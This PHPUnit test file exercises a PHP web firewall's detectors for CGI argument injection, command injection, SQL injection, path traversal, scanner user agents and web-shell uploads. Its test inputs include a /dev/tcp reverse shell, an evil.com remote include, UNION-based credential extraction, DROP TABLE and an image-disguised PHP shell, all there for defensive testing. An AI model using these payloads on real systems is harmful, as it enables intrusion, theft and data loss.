<?php

namespace Tests\Unit;

use PHPUnit\Framework\TestCase;
use Ace\Firewall;

class FirewallTest extends TestCase
{
    protected Firewall $firewall;
    protected string $tempStorage;

    protected function setUp(): void
    {
        $this->tempStorage = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'ace_firewall_test_' . uniqid();
        mkdir($this->tempStorage, 0755, true);
        Firewall::setStoragePath($this->tempStorage);
        $this->firewall = new Firewall();
    }

    protected function tearDown(): void
    {
        $_SERVER = [];
        $_GET = [];
        $_POST = [];
        $_FILES = [];
        Firewall::setStoragePath(null);
        $this->cleanup($this->tempStorage);
    }

    private function cleanup(string $dir): void
    {
        if (!is_dir($dir)) {
            return;
        }
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $p = $dir . DIRECTORY_SEPARATOR . $item;
            is_dir($p) ? $this->cleanup($p) : @unlink($p);
        }
        @rmdir($dir);
    }

    public function test_cve_2024_4577_cgi_argument_injection_detection(): void
    {
        // 1. Soft hyphen URL-encoded exploits (%ad, %AD)
        $this->assertTrue($this->firewall->detectCgiArgumentInjection('%ad-d+allow_url_include=1', '/index.php?%ad-d'));
        $this->assertTrue($this->firewall->detectCgiArgumentInjection('%AD-s', '/index.php?%AD-s'));

        // 2. Direct CGI switch injection
        $this->assertTrue($this->firewall->detectCgiArgumentInjection('-d+auto_prepend_file=php://input', '/index.php?-d'));
        $this->assertTrue($this->firewall->detectCgiArgumentInjection('-s', '/test.php?-s'));

        // 3. Dangerous runtime directives in query string
        $this->assertTrue($this->firewall->detectCgiArgumentInjection('foo=1&auto_prepend_file=http://evil.com/shell', '/'));
        $this->assertTrue($this->firewall->detectCgiArgumentInjection('allow_url_include=1', '/'));
        $this->assertTrue($this->firewall->detectCgiArgumentInjection('disable_functions=""', '/'));

        // 4. Safe query strings should NOT trigger detection
        $this->assertFalse($this->firewall->detectCgiArgumentInjection('page=2&sort=name&search=keyword', '/articles?page=2'));
        $this->assertFalse($this->firewall->detectCgiArgumentInjection('tab=overview', '/dashboard'));
    }

    public function test_command_injection_and_rce_detection(): void
    {
        // Dangerous functions
        $this->assertTrue($this->firewall->detectCommandInjection('system("whoami")'));
        $this->assertTrue($this->firewall->detectCommandInjection('shell_exec("cat /etc/passwd")'));
        $this->assertTrue($this->firewall->detectCommandInjection('passthru("id")'));
        $this->assertTrue($this->firewall->detectCommandInjection('eval(base64_decode("PD9waHAg..."))'));

        // Shell binaries and reverse shell invocations
        $this->assertTrue($this->firewall->detectCommandInjection('/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'));
        $this->assertTrue($this->firewall->detectCommandInjection('powershell.exe -ExecutionPolicy Bypass -Command ...'));
        $this->assertTrue($this->firewall->detectCommandInjection('cmd.exe /c dir'));

        // Chained shell commands
        $this->assertTrue($this->firewall->detectCommandInjection('image.png; whoami'));
        $this->assertTrue($this->firewall->detectCommandInjection('test | id'));

        // Safe normal inputs
        $this->assertFalse($this->firewall->detectCommandInjection('Hello world!'));
        $this->assertFalse($this->firewall->detectCommandInjection('John Doe'));
        $this->assertFalse($this->firewall->detectCommandInjection('My systematic approach to problem solving'));
    }

    public function test_sql_injection_detection(): void
    {
        // UNION SELECT
        $this->assertTrue($this->firewall->detectSqlInjection("1' UNION SELECT null, username, password FROM users --"));
        $this->assertTrue($this->firewall->detectSqlInjection("UNION ALL SELECT 1, 2, 3"));

        // Boolean tautology with comment
        $this->assertTrue($this->firewall->detectSqlInjection("admin' OR 1=1 --"));
        $this->assertTrue($this->firewall->detectSqlInjection("1' OR '1'='1"));

        // Time-based blind SQLi
        $this->assertTrue($this->firewall->detectSqlInjection("1; SELECT SLEEP(5);"));
        $this->assertTrue($this->firewall->detectSqlInjection("BENCHMARK(5000000, MD5(1))"));
        $this->assertTrue($this->firewall->detectSqlInjection("WAITFOR DELAY '0:0:5'"));

        // Information schema extraction
        $this->assertTrue($this->firewall->detectSqlInjection("SELECT column_name FROM information_schema.columns"));

        // Destructive injection
        $this->assertTrue($this->firewall->detectSqlInjection("1; DROP TABLE users;"));

        // Safe inputs
        $this->assertFalse($this->firewall->detectSqlInjection("Alice Smith"));
        $this->assertFalse($this->firewall->detectSqlInjection("Standard select option"));
    }

    public function test_path_traversal_detection(): void
    {
        // Standard and encoded directory traversal
        $this->assertTrue($this->firewall->detectPathTraversal('/../../etc/passwd', ''));
        $this->assertTrue($this->firewall->detectPathTraversal('/index.php?file=..%2f..%2fwin.ini', 'file=..%2f..%2fwin.ini'));

        // Null byte injection
        $this->assertTrue($this->firewall->detectPathTraversal('/index.php?file=secret.php%00.jpg', 'file=secret.php%00.jpg'));

        // PHP wrappers
        $this->assertTrue($this->firewall->detectPathTraversal('/index.php?page=php://filter/convert.base64-encode/resource=index.php', ''));

        // Sensitive files
        $this->assertTrue($this->firewall->detectPathTraversal('/.env', ''));
        $this->assertTrue($this->firewall->detectPathTraversal('/.git/HEAD', ''));

        // Safe requests
        $this->assertFalse($this->firewall->detectPathTraversal('/about-us', 'lang=en'));
        $this->assertFalse($this->firewall->detectPathTraversal('/assets/css/app.css', 'v=1.2'));
    }

    public function test_bad_user_agent_detection(): void
    {
        $this->assertTrue($this->firewall->detectBadUserAgent('sqlmap/1.6#stable'));
        $this->assertTrue($this->firewall->detectBadUserAgent('Mozilla/5.0 (Nikto/2.1.6)'));
        $this->assertTrue($this->firewall->detectBadUserAgent('Acunetix-Security-Scanner'));
        $this->assertTrue($this->firewall->detectBadUserAgent('gobuster/3.1.0'));
        $this->assertTrue($this->firewall->detectBadUserAgent('wpscan v3.8.20'));

        // Normal browser user-agents
        $this->assertFalse($this->firewall->detectBadUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'));
        $this->assertFalse($this->firewall->detectBadUserAgent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15'));
    }

    public function test_web_shell_file_upload_inspection(): void
    {
        // 1. Block executable extension (.php, .phtml, .phar, etc.)
        $tmp1 = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'fake_tmp_1_' . uniqid() . '.tmp';
        file_put_contents($tmp1, '<?php echo "shell"; ?>');
        $_FILES = [
            'avatar' => [
                'name' => 'exploit.php',
                'tmp_name' => $tmp1,
            ],
        ];

        $threat = $this->firewall->inspectUploads();
        $this->assertNotNull($threat);
        $this->assertStringContainsString('Executable extension', $threat);
        @unlink($tmp1);

        // 2. Block double extension attacks (e.g. avatar.php.png)
        $tmp2 = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'fake_tmp_2_' . uniqid() . '.tmp';
        file_put_contents($tmp2, 'fake image data');
        $_FILES = [
            'avatar' => [
                'name' => 'avatar.php.png',
                'tmp_name' => $tmp2,
            ],
        ];

        $threat = $this->firewall->inspectUploads();
        $this->assertNotNull($threat);
        $this->assertStringContainsString('Double extension', $threat);
        @unlink($tmp2);

        // 3. Block image with embedded PHP web shell code
        $tmp3 = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'fake_tmp_3_' . uniqid() . '.tmp';
        file_put_contents($tmp3, "GIF89a<?php system('whoami'); ?>");
        $_FILES = [
            'avatar' => [
                'name' => 'innocent.jpg',
                'tmp_name' => $tmp3,
            ],
        ];

        $threat = $this->firewall->inspectUploads();
        $this->assertNotNull($threat);
        $this->assertStringContainsString('Embedded PHP executable script', $threat);
        @unlink($tmp3);

        // 4. Safe legitimate file passes inspection
        $tmp4 = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'fake_tmp_4_' . uniqid() . '.tmp';
        file_put_contents($tmp4, "\xFF\xD8\xFF\xE0\x00\x10JFIF legitimate binary image content");
        $_FILES = [
            'avatar' => [
                'name' => 'profile.jpg',
                'tmp_name' => $tmp4,
            ],
        ];

        $threat = $this->firewall->inspectUploads();
        $this->assertNull($threat);
        @unlink($tmp4);
    }

    public function test_ip_banning_and_unbanning(): void
    {
        $testIp = '203.0.113.195';

        // Initially not banned
        $this->assertFalse($this->firewall->isIpBanned($testIp));

        // Record violations to trigger auto-ban (threshold = 3)
        $ref = new \ReflectionClass($this->firewall);
        $method = $ref->getMethod('recordViolation');
        $method->setAccessible(true);

        $method->invoke($this->firewall, $testIp, Firewall::THREAT_SQL_INJECTION, 'Test attempt 1');
        $this->assertFalse($this->firewall->isIpBanned($testIp));

        $method->invoke($this->firewall, $testIp, Firewall::THREAT_SQL_INJECTION, 'Test attempt 2');
        $this->assertFalse($this->firewall->isIpBanned($testIp));

        $method->invoke($this->firewall, $testIp, Firewall::THREAT_SQL_INJECTION, 'Test attempt 3');
        // Now threat score reached 3 => should be banned!
        $this->assertTrue($this->firewall->isIpBanned($testIp));

        // Unban should remove ban
        $this->assertTrue(Firewall::unban($testIp));
        $this->assertFalse($this->firewall->isIpBanned($testIp));
    }
}
